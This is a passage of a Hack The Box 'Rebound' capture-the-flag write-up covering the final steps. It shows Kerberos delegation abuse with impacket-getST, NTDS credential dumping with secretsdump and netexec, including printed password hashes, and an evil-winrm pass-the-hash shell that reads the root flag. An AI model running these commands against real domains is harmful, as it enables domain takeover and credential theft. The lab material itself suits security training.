6e44de56558173a2fdbf56c376c8108eac757f546f20fbfa90f09c4280393a4efa8b0215042bb9e17aa5598fb7fef950102a633d83d585a70a3be0f096c8107548a6321d15c339056d777b51d632bbfaaa499a2f5d19e68daadeee55f95f1e36a8375db95a3bdb13122c005073478982b5d60c9c4cb7450a3f37cbb740b54319012e3e31b8d43b8fb52c85777daa47693d699c180ae9caaca0fb3b7e22b1e3aef7318c47c72e89402b6b2779e9252fac07f1d6ec8c5a9e121a626cecdea3450f696d0866fbec62032a734fa1a98c4cbd2c3119c4c47dad6bff1c69e1e0ae01b2d8c340a064523668ad0b4b1a387addbe38d01b54bae6d51394b1fb3551c62fcca9468dde34d97d33d1cde62ffa7e20fb870567cb81b20d7857bd74463e70932949f41e1f4a470b67cbcb5fd738304a35d998bf55e88ba7376aaa644ef0ff926b612f1fe424342233ff04e27465c9d4f51d500d5675bafd13efeb81a8ebccd17542e483c3e5132b4e983d9a868721f3655c7305ec53a0fa09be9e9c06b926b7f7f8a31ad469b15263ab3b95a12d685ab158dbb8af9b96dddf5113
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```


```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-getST -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket dc01.ccache "rebound.htb/delegator$" -hashes :4ba33add1108fe560429fc27a1bcab6b -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating dc01$
[*] 	Using additional ticket dc01.ccache instead of S4U2Self
/usr/share/doc/python3-impacket/examples/getST.py:287: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:339: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ mv dc01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache dc01.ccache
```


## Duming the ntds

using impacket

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-secretsdump -no -k dc01.rebound.htb -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up... 
```

We can do the same using `netexec`.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec smb dc01.rebound.htb --use-kcache --ntds --user administrator
SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\DC01$ from ccache 
SMB         dc01.rebound.htb 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc01.rebound.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.rebound.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
SMB         dc01.rebound.htb 445    DC01             [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/DC01_dc01.rebound.htb_2024-12-20_084157.ntds of which 1 were added to the database
SMB         dc01.rebound.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.rebound.htb 445    DC01             [*] cat /home/kali/.nxc/logs/DC01_dc01.rebound.htb_2024-12-20_084157.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.rebound.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/DC01_dc01.rebound.htb_2024-12-20_084157.ntds | cut -d ':' -f1
```

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ evil-winrm -i dc01.rebound.htb -u administrator -H 176be138594933bb67db3b2572fc91b8 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
f05020fe6e4729dd66d43a27d249a9f8
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

> `Root flag` is located at `C:\Users\Administrator\Desktop\root.txt`.
{: .prompt-info}





